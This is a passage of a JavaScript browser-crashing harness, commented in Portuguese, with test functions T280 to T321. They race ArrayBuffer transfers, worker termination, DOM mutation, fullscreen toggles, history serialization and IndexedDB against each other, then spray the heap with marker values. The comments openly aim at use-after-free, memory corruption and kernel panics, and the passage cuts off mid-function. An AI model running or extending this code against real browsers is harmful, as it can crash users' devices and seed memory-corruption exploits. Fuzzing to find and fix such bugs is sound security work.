    reqFS(el);
    
    var cycles = 0;
    var t = setInterval(function() {
        cycles++;
        
        // 1. Worker Transfer Race
        try { w.postMessage(ab, [ab]); } catch(e) { ab = new ArrayBuffer(1024*1024); }
        
        // 2. History Push
        try { history.replaceState({}, ""+cycles, "/"+cycles); } catch(e){}
        
        // 3. Exit FS abruptamente
        if(cycles % 5 === 0) exitFS();
        if(cycles % 5 === 2) reqFS(el);
        
        // 4. Alloc Heavy
        var junk = new Float32Array(10000);
        
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        exitFS();
        document.body.removeChild(el);
        log(">> T280: Cluster event finished.");
    }, 4000);
}
function runTest281() {
    log("Iniciando T281: Worker Port Transfer Terminate...");
    var ch = new MessageChannel();
    var p1 = ch.port1;
    var p2 = ch.port2;
    var b = new Blob(["self.onmessage=function(e){var p=e.data; p.postMessage('ping'); self.close();}"], {type:'js'});
    
    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(b));
        try {
            w.postMessage(p2, [p2]);
            var junk = new ArrayBuffer(0x1000);
            w.terminate();
            p1.postMessage("dead");
        } catch(e) {}
        ch = new MessageChannel();
        p1 = ch.port1; 
        p2 = ch.port2;
        var spray = new Uint8Array(0x100).fill(0xCC);
    }, 15);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T281: Port termination race done.");
    }, 3000);
}

function runTest282() {
    log("Iniciando T282: TypedArray Neuter View Race...");
    var ab = new ArrayBuffer(1024 * 1024);
    var view = new Uint8Array(ab);
    view[0] = 0xAA;
    var b = new Blob(["self.onmessage=function(e){postMessage('ok');}"], {type:'js'});
    var w = new Worker(URL.createObjectURL(b));
    
    try {
        w.postMessage(ab, [ab]);
        var v = view[0];
        if(v !== undefined) {
            var spray = new Float64Array(10000).fill(1.1);
        }
        ab = new ArrayBuffer(1024 * 1024);
        view = new Uint8Array(ab);
        view[0] = 0xBB;
        log(">> T282: Transfer logic executed.");
    } catch(e) {}
    w.terminate();
}

function runTest283() {
    log("Iniciando T283: DOM Range Mutation Event UAF...");
    var d = document.createElement('div');
    d.innerHTML = "<b>A</b><span>B</span><i>C</i>";
    document.body.appendChild(d);
    var r = document.createRange();
    r.setStart(d, 0);
    r.setEnd(d, 3);
    
    d.addEventListener('DOMNodeRemoved', function(e) {
        if(e.target.tagName === 'SPAN') {
            r.deleteContents();
            var s = document.createElement('div');
            s.innerHTML = "X".repeat(100);
            d.appendChild(s);
            var spray = new Uint32Array(100).fill(0xDEAD);
        }
    });
    
    try {
        d.innerHTML = "";
    } catch(e) {}
    
    setTimeout(function() {
        if(document.body.contains(d)) document.body.removeChild(d);
        log(">> T283: Range mutation trap.");
    }, 1000);
}

function runTest284() {
    log("Iniciando T284: History State Accessor Poison...");
    var poison = {};
    Object.defineProperty(poison, 'state', {
        get: function() {
            history.replaceState(null, null, "/uaf");
            var a = new Array(5000).fill(1);
            return "poison";
        },
        enumerable: true
    });
    
    var t = setInterval(function() {
        try {
            history.pushState(poison, "P", "/p");
            history.go(-1);
        } catch(e) {}
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T284: History getter poison.");
    }, 3000);
}

function runTest285() {
    log("Iniciando T285: Blob URL Revoke XHR Thread...");
    var data = new Uint8Array(1024*1024).fill(0x41);
    var b = new Blob([data]);
    var u = URL.createObjectURL(b);
    var workers = [];
    
    var code = "self.onmessage=function(u){var x=new XMLHttpRequest(); x.open('GET',u,false); try{x.send();}catch(e){}}";
    var wb = new Blob([code], {type:'js'});
    
    for(var i=0; i<8; i++) workers.push(new Worker(URL.createObjectURL(wb)));
    
    var t = setInterval(function() {
        workers.forEach(w => w.postMessage(u));
        URL.revokeObjectURL(u);
        u = URL.createObjectURL(new Blob([data]));
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        workers.forEach(w => w.terminate());
        log(">> T285: Blob race finished.");
    }, 3000);
}

function runTest286() {
    log("Iniciando T286: Video Fullscreen Orphan Swap...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    reqFS(v);
    
    setTimeout(function() {
        document.body.removeChild(v);
        v.src = "invalid";
        exitFS();
        var s = new Uint32Array(0x4000).fill(0x1337);
        var c = document.createElement('canvas');
        c.width=1920; c.height=1080;
        c.getContext('2d').fillRect(0,0,1,1);
        log(">> T286: Video orphan swap.");
    }, 200);
}

function runTest287() {
    log("Iniciando T287: Iframe History Nav Detach...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    f.onload = function() {
        var w = f.contentWindow;
        w.history.pushState({}, "1", "/1");
        
        var el = f.contentDocument.createElement('div');
        f.contentDocument.body.appendChild(el);
        if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
        
        setTimeout(function() {
            w.history.back();
            document.body.removeChild(f);
            var spray = new Array(1000).fill("A");
        }, 100);
    };
    f.src = "about:blank";
    
    log(">> T287: Iframe nav detach scheduled.");
}

function runTest288() {
    log("Iniciando T288: Canvas GPU Buffer Resize Race...");
    var c = document.createElement('canvas');
    c.width = 1000; c.height = 1000;
    document.body.appendChild(c);
    var ctx = c.getContext('2d');
    reqFS(c);
    
    var t = setInterval(function() {
        c.width = 0;
        ctx.fillStyle = "red";
        ctx.fillRect(0,0,1000,1000);
        c.width = 1000;
        var d = ctx.getImageData(0,0,1,1);
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(c);
        log(">> T288: GPU buffer race done.");
    }, 3000);
}

function runTest289() {
    log("Iniciando T289: Sync XHR Worker Kill Switch...");
    var code = "self.onmessage=function(u){var x=new XMLHttpRequest(); x.open('GET',u,false); x.send();}";
    var b = new Blob([code], {type:'js'});
    
    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(b));
        w.postMessage("/?hang=" + Math.random());
        setTimeout(() => w.terminate(), 5);
        var spray = new Uint8Array(1024).fill(0xFE);
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T289: Sync XHR kill loop.");
    }, 3000);
}

function runTest290() {
    log("Iniciando T290: THE VOID WALKER (COMBO)...");
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){postMessage(e.data,[e.data]);}"],{type:'js'})));
    var ab = new ArrayBuffer(1024*1024);
    var el = document.createElement('div');
    document.body.appendChild(el);
    reqFS(el);
    
    var i = 0;
    var t = setInterval(function() {
        i++;
        try { w.postMessage(ab, [ab]); } catch(e) { ab = new ArrayBuffer(1024*1024); }
        if(i % 5 === 0) {
            history.pushState({}, "x", "/"+i);
            exitFS();
        }
        if(i % 5 === 2) reqFS(el);
        
        var junk = new Float32Array(10000);
    }, 30);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        exitFS();
        document.body.removeChild(el);
        log(">> T290: Void walker finished.");
    }, 4000);
}
function runTest291() {
    log("Iniciando T291: Intersection Observer Removal Race...");
    var root = document.createElement('div');
    root.style.overflow = "scroll";
    root.style.height = "100px";
    var target = document.createElement('div');
    target.style.height = "200px";
    root.appendChild(target);
    document.body.appendChild(root);

    var obs = new IntersectionObserver(function(entries) {
        // Callback executado pelo loop de renderização
        // Removemos o elemento observado e o root simultaneamente
        document.body.removeChild(root);
        // Tentamos forçar layout no elemento desconectado
        var h = target.offsetHeight;
        // Spray para corromper a memória do observer interno
        var spray = new Uint32Array(1000).fill(0xDEADBEEF);
    });

    obs.observe(target);
    root.scrollTop = 50; // Trigger

    setTimeout(function() {
        obs.disconnect();
        log(">> T291: Observer race triggered.");
    }, 1000);
}

function runTest292() {
    log("Iniciando T292: Resize Observer SVG Pattern Loop...");
    var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
    var rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
    svg.appendChild(rect);
    document.body.appendChild(svg);

    var ro = new ResizeObserver(function(entries) {
        // Modifica atributos que causam resize imediato
        // Tenta criar um loop de layout infinito que o browser deve abortar,
        // mas combinamos com Fullscreen para estressar o compositor
        svg.style.width = (Math.random() * 500) + "px";
        if(Math.random() > 0.9) reqFS(svg);
        else exitFS();
    });

    ro.observe(svg);
    svg.style.width = "100px";

    setTimeout(function() {
        ro.disconnect();
        if(document.body.contains(svg)) document.body.removeChild(svg);
        exitFS();
        log(">> T292: Resize loop stopped.");
    }, 3000);
}

function runTest293() {
    log("Iniciando T293: Mutation Observer Char Data Flood...");
    var div = document.createElement('div');
    var text = document.createTextNode("Start");
    div.appendChild(text);
    document.body.appendChild(div);

    var mo = new MutationObserver(function(mutations) {
        // Acesso a mutations corrompidas ou antigas
        var junk = [];
        for(var i=0; i<1000; i++) junk.push(document.createTextNode("JUNK"));
    });

    mo.observe(text, {characterData: true, characterDataOldValue: true});

    var t = setInterval(function() {
        // Modificações rápidas no TextNode
        // characterDataOldValue força o motor a copiar strings antigas
        text.data = "X".repeat(1024 * 64) + Math.random();
        // Toggle display para forçar reflow
        div.style.display = "none";
        div.offsetHeight;
        div.style.display = "block";
    }, 10);

    setTimeout(function() {
        clearInterval(t);
        mo.disconnect();
        document.body.removeChild(div);
        log(">> T293: Mutation flood finished.");
    }, 3000);
}

function runTest294() {
    log("Iniciando T294: DOM Node Inserted Into Itself Trap...");
    var d1 = document.createElement('div');
    var d2 = document.createElement('div');
    
    // Tenta criar ciclos na árvore DOM manipulando pointers diretamente se possível
    // Via eventos de inserção
    d1.addEventListener('DOMNodeInserted', function(e) {
        try {
            // Tenta inserir o pai dentro do filho durante o evento de inserção
            e.target.appendChild(d1);
        } catch(z) {}
    });

    try {
        d1.appendChild(d2);
        document.body.appendChild(d1);
    } catch(e) {}

    setTimeout(function() {
        if(document.body.contains(d1)) document.body.removeChild(d1);
        log(">> T294: Cyclic insertion attempt.");
    }, 1000);
}

function runTest295() {
    log("Iniciando T295: Object Getter postMessage Detach...");
    var ab = new ArrayBuffer(1024 * 1024);
    var mc = new MessageChannel();
    
    var obj = {
        get buf() {
            // Getter chamado durante a clonagem estruturada
            // Transfere o buffer para outra porta ANTES de ele ser clonado aqui
            mc.port1.postMessage(ab, [ab]);
            return ab;
        }
    };

    try {
        // Tenta enviar o objeto que contém o buffer.
        // O algoritmo de clone deve ler 'buf', acionar o getter, que transfere o buffer.
        // O clone então tenta ler um buffer neuterizado.
        window.postMessage(obj, "*", [mc.port2]); 
    } catch(e) {
        log(">> T295 Logic: " + e.message);
    }
}

function runTest296() {
    log("Iniciando T296: Crypto Worker Terminate Race...");
    if(!window.crypto || !window.crypto.subtle) { log(">> T296: Crypto N/A"); return; }
    
    var code = `
        self.onmessage = function(e) {
            var data = new Uint8Array(1024*1024*5);
            // Operação pesada de crypto
            crypto.getRandomValues(data);
            postMessage(data, [data.buffer]);
        }
    `;
    var b = new Blob([code], {type:'js'});

    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(b));
        w.postMessage("start");
        
        // Mata o worker enquanto o driver de crypto do kernel está preenchendo o buffer
        // Tentativa de corromper o ponteiro de destino no kernel
        setTimeout(() => w.terminate(), 1);
        
        var spray = new Uint8Array(1024*1024).fill(0xCC);
    }, 20);

    setTimeout(function() {
        clearInterval(t);
        log(">> T296: Crypto race stopped.");
    }, 3000);
}

function runTest297() {
    log("Iniciando T297: IndexedDB Blob Worker Transfer...");
    var dbName = "crashDB" + Date.now();
    var req = indexedDB.open(dbName, 1);
    
    req.onupgradeneeded = function(e) {
        var db = e.target.result;
        db.createObjectStore("store");
    };

    req.onsuccess = function(e) {
        var db = e.target.result;
        var blob = new Blob([new Uint8Array(1024*1024).fill(1)]);
        var tx = db.transaction("store", "readwrite");
        tx.objectStore("store").put(blob, "key");
        
        tx.oncomplete = function() {
            // Lê blob do DB
            var r2 = db.transaction("store").objectStore("store").get("key");
            r2.onsuccess = function(ev) {
                var dbBlob = ev.target.result;
                var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){postMessage(e.data);}"],{type:'js'})));
                
                // Transfere handle do blob para worker
                w.postMessage(dbBlob);
                
                // Fecha conexão e deleta DB imediatamente
                db.close();
                indexedDB.deleteDatabase(dbName);
                
                // Mata worker
                w.terminate();
            };
        };
    };
    log(">> T297: IDB Blob sequence initiated.");
}

function runTest298() {
    log("Iniciando T298: LocalStorage Sync Write Thread Kill...");
    var code = `
        self.onmessage = function(e) {
            // Loop de escrita síncrona
            // LocalStorage em workers pode não ser suportado em todas versões, mas tentamos
            try {
                for(var i=0; i<1000; i++) {
                   // Simulamos carga pesada se LS não existir
                   var x = new Float64Array(1000);
                }
            } catch(e){}
        }
    `;
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    
    var t = setInterval(function() {
        // Main thread escreve
        localStorage.setItem("key", "A".repeat(10000));
        w.postMessage("go");
        // Remove item causando lock no arquivo
        localStorage.removeItem("key");
    }, 10);

    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T298: Storage sync stress done.");
    }, 3000);
}

function runTest299() {
    log("Iniciando T299: DataView Unaligned Access Transfer...");
    var ab = new ArrayBuffer(1024);
    var view = new DataView(ab);
    
    // Acesso desalinhado (Offset 1 para Float64)
    // Hardware ARM/x86 lida com isso, mas a camada de abstração do ArrayBuffer pode falhar
    // se o buffer for movido/transferido
    view.setFloat64(1, 1.2345678);
    
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){var v=new DataView(e.data); v.getFloat64(1);}"], {type:'js'})));
    
    try {
        w.postMessage(ab, [ab]);
        // Tenta acessar view antiga
        view.getFloat64(1); 
    } catch(e) {}
    
    // Aloca novo buffer desalinhado
    var ab2 = new ArrayBuffer(1023); 
    log(">> T299: Unaligned memory test.");
}

function runTest300() {
    log("Iniciando T300: THE SYSTEM CRUNCH...");
    
    // 1. Observer
    var el = document.createElement('div');
    document.body.appendChild(el);
    var mo = new MutationObserver(() => { el.innerHTML = "M"; });
    mo.observe(el, {childList:true});
    
    // 2. Crypto Worker
    var cw = new Worker(URL.createObjectURL(new Blob([`self.onmessage=function(){if(self.crypto)crypto.getRandomValues(new Uint8Array(1000));}`],{type:'js'})));
    
    // 3. Storage
    localStorage.clear();
    
    var t = setInterval(function() {
        el.innerText = Math.random();
        cw.postMessage("x");
        localStorage.setItem("k", Math.random());
        
        // Interrupt
        if(Math.random() > 0.8) {
            cw.terminate();
            cw = new Worker(URL.createObjectURL(new Blob([`self.onmessage=function(){}`],{type:'js'})));
        }
    }, 20);

    setTimeout(function() {
        clearInterval(t);
        mo.disconnect();
        cw.terminate();
        document.body.removeChild(el);
        log(">> T300: System crunch finished.");
    }, 4000);
}
function runTest301() {
    log("Iniciando T301: Proxy Constructor TypedArray Trap...");
    // Tenta confundir o construtor interno de arrays tipados usando um Proxy
    // Isso explora como o WebKit verifica tipos durante a alocação
    var p = new Proxy(Array, {
        get: function(target, prop) {
            if(prop === "prototype") return Array.prototype;
            if(prop === Symbol.species) return function(){ return {length: 0xFFFFFFFF}; };
            return target[prop];
        },
        construct: function(target, args) {
            // Retorna um objeto que parece um array mas corrompe o length
            return { length: 0, [0]: 1, buffer: new ArrayBuffer(0x10) };
        }
    });

    try {
        // Uint8Array.from tenta usar o iterador e construtor
        var arr = Uint8Array.from({length: 100, [Symbol.iterator]: function*() { yield 1; }}, p);
        log(">> T301: Proxy construction passed (Unexpected).");
    } catch(e) {
        log(">> T301 Error: " + e.message);
        // Spray imediato caso tenha havido corrupção silenciosa
        var spray = new Uint32Array(0x1000).fill(0x11223344);
    }
}

function runTest302() {
    log("Iniciando T302: History Cyclic State JSON Attack...");
    var a = {};
    var b = { parent: a };
    a.child = b;
    
    // Define um toJSON customizado que modifica o grafo de objetos DURANTE a serialização
    Object.defineProperty(a, "toJSON", {
        value: function() {
            // Modifica o histórico enquanto o serializador está percorrendo o objeto
            try { history.replaceState(null, null, "/corrupt_json"); } catch(e) {}
            // Aloca memória para forçar movimento no heap
            var tmp = new Array(5000).fill("JUNK");
            return { x: 1 };
        }
    });

    try {
        history.pushState(a, "Cyclic", "/cyclic");
    } catch(e) {
        log(">> T302 Serialization State: " + e.message);
    }
}

function runTest303() {
    log("Iniciando T303: Message Port Transfer Proxy Getter...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    
    // Objeto onde a propriedade 'transfer' é um getter malicioso
    var payload = {
        get data() {
            // Fecha a porta no momento exato da leitura
            p1.close();
            return new Uint8Array(1024);
        }
    };

    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){}"],{type:'js'})));
    
    try {
        // Tenta enviar a porta na lista de transferência, mas acessa o payload que fecha a porta
        // O algoritmo de postMessage valida as portas antes ou depois de serializar os dados?
        w.postMessage(payload, [p1]);
    } catch(e) {
        log(">> T303 blocked: " + e.message);
    }
    
    w.terminate();
}

function runTest304() {
    log("Iniciando T304: Regex LastIndex Worker Desync...");
    var re = /a/g;
    var str = "a".repeat(10000);
    
    var w = new Worker(URL.createObjectURL(new Blob([`
        self.onmessage = function(e) {
            var re = e.data;
            // Loop infinito de regex para estressar a engine de regex
            while(re.exec("aaaaaaaaaa") !== null) {}
        }
    `], {type:'js'})));

    // Envia RegExp para o worker (Clone estruturado)
    w.postMessage(re);

    // Modifica lastIndex na main thread simultaneamente
    var t = setInterval(function() {
        re.lastIndex = Math.floor(Math.random() * 10000);
        // Tenta forçar colisão de cache de regex se compartilhado (não deve ser, mas testamos)
        re.exec(str);
    }, 1);

    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T304: Regex fuzzing done.");
    }, 2000);
}

function runTest305() {
    log("Iniciando T305: DOM Node Iterator Removal UAF...");
    var root = document.createElement('div');
    root.innerHTML = "<span>A</span><b>B</b><div>C</div>".repeat(100);
    document.body.appendChild(root);

    var ni = document.createNodeIterator(root, NodeFilter.SHOW_ELEMENT, {
        acceptNode: function(node) {
            if(node.tagName === 'B') {
                // Remove o nó atual e seus vizinhos durante a iteração
                // O iterador precisa corrigir seu ponteiro interno 'referenceNode'
                if(node.nextSibling) root.removeChild(node.nextSibling);
                root.removeChild(node);
                
                // Spray para ocupar o espaço do nó removido
                var div = document.createElement('div');
                div.textContent = "SPRAY";
                return NodeFilter.FILTER_ACCEPT;
            }
            return NodeFilter.FILTER_SKIP;
        }
    });

    try {
        while(ni.nextNode()) {}
        log(">> T305: NodeIterator traversal finished.");
    } catch(e) {
        log(">> T305 Logic Error: " + e.message);
    }
    document.body.removeChild(root);
}

function runTest306() {
    log("Iniciando T306: IndexedDB Upgrade History Nav Crash...");
    var name = "db_" + Date.now();
    var req = indexedDB.open(name, 1);

    req.onupgradeneeded = function(e) {
        var db = e.target.result;
        db.createObjectStore("store");
        
        // Durante a transação de upgrade (que trava o DB), forçamos uma navegação
        // Isso tenta destruir o contexto JS que segura a transação de upgrade ativa
        history.pushState({}, "nav", "/upgrade_crash");
        
        // Tenta recarregar a página (ou navegar para outra) via location
        // Em um ambiente restrito, isso pode causar panic no gerenciador de transações do kernel
        var iframe = document.createElement('iframe');
        document.body.appendChild(iframe);
        iframe.contentWindow.location.reload();
    };
    
    log(">> T306: DB Upgrade triggered.");
}

function runTest307() {
    log("Iniciando T307: Crypto Random Buffer Terminate Race...");
    if(!window.crypto) { log("T307: Crypto N/A"); return; }

    var b = new Blob([`
        self.onmessage = function() {
            // Buffer grande alinhado a página (4KB * N)
            var buf = new Uint8Array(1024 * 1024 * 4); 
            // Syscall bloqueante/pesada
            crypto.getRandomValues(buf);
            postMessage(buf, [buf.buffer]);
        }
    `], {type:'js'});

    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(b));
        w.postMessage("start");
        
        // Termina o worker imediatamente, tentando interromper a syscall 'getrandom' ou similar
        // Se o buffer de destino na userland desaparecer enquanto o kernel escreve -> Panic
        setTimeout(() => w.terminate(), 2);
        
        var spray = new Uint32Array(1024*256).fill(0xDEADBEEF);
    }, 20);

    setTimeout(function() {
        clearInterval(t);
        log(">> T307: Crypto race stopped.");
    }, 3000);
}

function runTest308() {
    log("Iniciando T308: LocalStorage Sync Blob Flood...");
    var huge = "X".repeat(1024 * 100); // 100KB chunks
    
    var t = setInterval(function() {
        try {
            // Escrita síncrona
            localStorage.setItem("flood", huge);
            
            // Leitura imediata como Blob (se API suportar conversão direta ou via File)
            // Caso contrário, usamos FileReader em string convertida
            var b = new Blob([localStorage.getItem("flood")]);
            
            // Cria URL e revoga rápido
            var u = URL.createObjectURL(b);
            URL.revokeObjectURL(u);
            
            // Remove item
            localStorage.removeItem("flood");
        } catch(e) {
            localStorage.clear();
        }
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T308: Storage flood stopped.");
    }, 3000);
}

function runTest309() {
    log("Iniciando T309: Resize Observer Fullscreen Detach...");
    var el = document.createElement('div');
    el.style.background = "purple";
    el.style.width = "100px"; el.style.height = "100px";
    document.body.appendChild(el);
    
    var ro = new ResizeObserver(function() {
        // Callback executado no ciclo de layout
        // Pede Fullscreen
        reqFS(el);
        
        // Remove do DOM imediatamente após pedir FS
        if(document.body.contains(el)) document.body.removeChild(el);
        
        // Tenta alterar estilo do elemento desconectado
        el.style.width = "200px";
        
        // Spray
        var x = new ArrayBuffer(0x4000);
    });
    
    ro.observe(el);
    
    // Trigger
    setTimeout(() => { el.style.width = "110px"; }, 100);
    
    setTimeout(function() {
        ro.disconnect();
        exitFS();
        log(">> T309: RO/FS Detach logic done.");
    }, 2000);
}

function runTest310() {
    log("Iniciando T310: THE KERNEL SHREDDER...");
    // Combina Crypto + Worker + IDB Handles
    
    var dbName = "shred_" + Date.now();
    var req = indexedDB.open(dbName, 1);
    
    req.onupgradeneeded = function(e) {
        e.target.result.createObjectStore("s");
    };
    
    req.onsuccess = function(e) {
        var db = e.target.result;
        var wCode = `
            self.onmessage = function(e) {
                // Worker recebe chave, gera crypto, tenta salvar
                var d = new Uint8Array(1024);
                crypto.getRandomValues(d);
                postMessage(d);
            }
        `;
        var blob = new Blob([wCode], {type:'js'});
        var w = new Worker(URL.createObjectURL(blob));
        
        var t = setInterval(function() {
            w.postMessage("go");
            
            // Transaction na main thread
            var tx = db.transaction("s", "readwrite");
            tx.objectStore("s").put(Math.random(), "k");
            
            // Termina worker aleatoriamente
            if(Math.random() > 0.8) {
                w.terminate();
                w = new Worker(URL.createObjectURL(blob));
            }
        }, 10);
        
        setTimeout(function() {
            clearInterval(t);
            w.terminate();
            db.close();
            indexedDB.deleteDatabase(dbName);
            log(">> T310: Shredder stopped.");
        }, 4000);
    };
}
function runTest311() {
    log("Iniciando T311: Proxy Transfer List Getter UAF...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    var transferProxy = new Proxy(p1, {
        get: function(target, prop) {
            if (prop === 'close') {
                target.close();
                var spray = new Uint8Array(1024).fill(0x41);
                return target[prop];
            }
            return target[prop];
        }
    });
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){}"],{type:'js'})));
    try {
        var payload = { port: transferProxy };
        w.postMessage(payload, [transferProxy]);
    } catch(e) {
        log(">> T311 Caught: " + e.message);
    }
    setTimeout(function(){ w.terminate(); }, 1000);
}

function runTest312() {
    log("Iniciando T312: ArrayBuffer Detachment Race Loop...");
    var ab = new ArrayBuffer(1024 * 1024);
    var view = new Uint8Array(ab);
    view[0] = 0xAA;
    var code = "self.onmessage=function(e){var d=e.data; if(d.byteLength) postMessage(d, [d]);}";
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    var i = 0;
    
    w.onmessage = function(e) {
        var back = e.data;
        if(i++ < 100) {
            try {
                w.postMessage(back, [back]);
                var v = view[0]; 
                if(v !== undefined) {
                    var junk = new Float64Array(1000);
                }
            } catch(z) {}
        } else {
            w.terminate();
        }
    };
    w.postMessage(ab, [ab]);
    log(">> T312: Detach race cycle running.");
}

function runTest313() {
    log("Iniciando T313: Cyclic History JSON DOM Mutation...");
    var obj = {};
    obj.a = obj;
    obj.b = new Array(500).fill(1);
    
    Object.defineProperty(obj, "toJSON", {
        value: function() {
            var d = document.createElement('div');
            for(var i=0; i<100; i++) d.appendChild(document.createElement('span'));
            document.body.appendChild(d);
            history.replaceState(null, null, "/mutated_" + Date.now());
            document.body.removeChild(d);
            return { val: "mutated" };
        }
    });

    try {
        history.pushState(obj, "Cycle", "/cycle");
        history.go(0);
    } catch(e) {
        log(">> T313 Serialization: " + e.message);
    }
}

function runTest314() {
    log("Iniciando T314: Mutation Observer Tree Walker Trap...");
    var root = document.createElement('div');
    root.innerHTML = "<div><span>target</span></div>".repeat(50);
    document.body.appendChild(root);
    
    var tw = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, null, false);
    var mo = new MutationObserver(function(mutations) {
        var n = tw.currentNode;
        if(n && n.parentNode) {
            n.parentNode.removeChild(n);
            var spray = new Uint32Array(100).fill(0xDEAD);
        }
    });
    
    mo.observe(root, {childList: true, subtree: true});
    
    while(tw.nextNode()) {
        if(tw.currentNode.tagName === 'SPAN') {
            tw.currentNode.textContent = "Modified";
        }
    }
    
    setTimeout(function() {
        mo.disconnect();
        if(document.body.contains(root)) document.body.removeChild(root);
        log(">> T314: Walker/Observer trap done.");
    }, 1000);
}

function runTest315() {
    log("Iniciando T315: RegExp Subclass Exec Memory Spike...");
    class BombRegExp extends RegExp {
        exec(str) {
            var res = super.exec(str);
            if (res) {
                this.lastIndex = 0;
                var junk = new Array(1000).fill("MEM");
            }
            return null; 
        }
    }
    
    var re = new BombRegExp("a", "g");
    var code = `self.onmessage=function(e){ var r=e.data; r.exec("aaaaaaaa"); }`;
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    
    try {
        w.postMessage(re);
    } catch(e) {
        var str = "a".repeat(10000);
        for(var i=0; i<100; i++) re.exec(str);
    }
    
    setTimeout(() => w.terminate(), 2000);
    log(">> T315: RegExp subclass stress.");
}

function runTest316() {
    log("Iniciando T316: Blob File Descriptor Thread Kill...");
    var d = new Uint8Array(1024*1024*2).fill(0x90);
    var b = new Blob([d]);
    var u = URL.createObjectURL(b);
    var workers = [];
    var code = "self.onmessage=function(u){var x=new XMLHttpRequest(); x.open('GET',u,false); try{x.send();}catch(e){}}";
    var wb = new Blob([code], {type:'js'});

    for(var i=0; i<10; i++) workers.push(new Worker(URL.createObjectURL(wb)));

    var t = setInterval(function() {
        workers.forEach(w => w.postMessage(u));
        URL.revokeObjectURL(u);
        u = URL.createObjectURL(new Blob([d]));
        if(Math.random() > 0.8) {
            var dead = workers.shift();
            if(dead) dead.terminate();
            workers.push(new Worker(URL.createObjectURL(wb)));
        }
    }, 20);

    setTimeout(function() {
        clearInterval(t);
        workers.forEach(w => w.terminate());
        log(">> T316: FD race stopped.");
    }, 3000);
}

function runTest317() {
    log("Iniciando T317: Canvas Pattern Resize Use-After-Free...");
    var c = document.createElement('canvas');
    c.width = 500; c.height = 500;
    var ctx = c.getContext('2d');
    var src = document.createElement('canvas');
    src.width = 50; src.height = 50;
    var sctx = src.getContext('2d');
    sctx.fillStyle = "red"; sctx.fillRect(0,0,50,50);
    
    var ptrn = ctx.createPattern(src, 'repeat');
    
    var t = setInterval(function() {
        ctx.fillStyle = ptrn;
        ctx.beginPath();
        ctx.moveTo(0,0);
        ctx.lineTo(500,500);
        ctx.lineTo(0,500);
        
        src.width = 0; 
        
        ctx.fill();
        
        src.width = 50;
        sctx.fillStyle = "blue"; sctx.fillRect(0,0,50,50);
    }, 15);

    setTimeout(function() {
        clearInterval(t);
        log(">> T317: Canvas pattern UAF attempt.");
    }, 3000);
}

function runTest318() {
    log("Iniciando T318: Fullscreen Video Orphan Surface...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    reqFS(v);

    setTimeout(function() {
        if(v.parentNode) v.parentNode.removeChild(v);
        v.src = "blob:null/invalid";
        v.load();
        
        exitFS();
        
        var c = document.createElement('canvas');
        c.width = 1920; c.height = 1080;
        var ctx = c.getContext('2d');
        ctx.fillRect(0,0,10,10);
        
        var spray = new Uint32Array(0x2000).fill(0xCAFEBABE);
        log(">> T318: Video surface orphan swap.");
    }, 500);
}

function runTest319() {
    log("Iniciando T319: LocalStorage IO History Flush Race...");
    var huge = "H".repeat(1024 * 50);
    
    var t = setInterval(function() {
        try {
            localStorage.setItem("key", huge);
            history.pushState({data: huge}, "title", "/flush");
            localStorage.removeItem("key");
            history.back();
        } catch(e) {
            localStorage.clear();
        }
    }, 10);

    setTimeout(function() {
        clearInterval(t);
        log(">> T319: IO/History flush stopped.");
    }, 3000);
}

function runTest320() {
    log("Iniciando T320: THE EVENT CASCADE (MULTI-VECTOR)...");
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){postMessage(e.data,[e.data]);}"],{type:'js'})));
    var ab = new ArrayBuffer(1024*1024);
    var el = document.createElement('div');
    document.body.appendChild(el);
    reqFS(el);

    var i = 0;
    var t = setInterval(function() {
        i++;
        try { w.postMessage(ab, [ab]); } catch(e) { ab = new ArrayBuffer(1024*1024); }
        
        if(i % 5 === 0) {
            var f = document.createElement('iframe');
            document.body.appendChild(f);
            f.src = "about:blank";
            setTimeout(() => document.body.removeChild(f), 10);
        }
        
        if(i % 10 === 0) exitFS();
        if(i % 10 === 5) reqFS(el);
    }, 30);

    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        exitFS();
        if(document.body.contains(el)) document.body.removeChild(el);
        log(">> T320: Event cascade finished.");
    }, 4000);
}
function runTest321() {
    log("Iniciando T321: Array Sort Buffer Transfer Detach...");
    // Vetor clássico: Desacoplar (neuter) o buffer subjacente durante a execução do sort
    var ab = new ArrayBuffer(1024 * 1024);
    var ia = new Int32Array(ab);
    for(var i=0; i<ia.length; i++) ia[i] = Math.random() * 10000;
    
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){postMessage('done');}"], {type:'js'})));
    var transferred = false;

    try {
        // O comparador é chamado internamente pelo algoritmo de sort
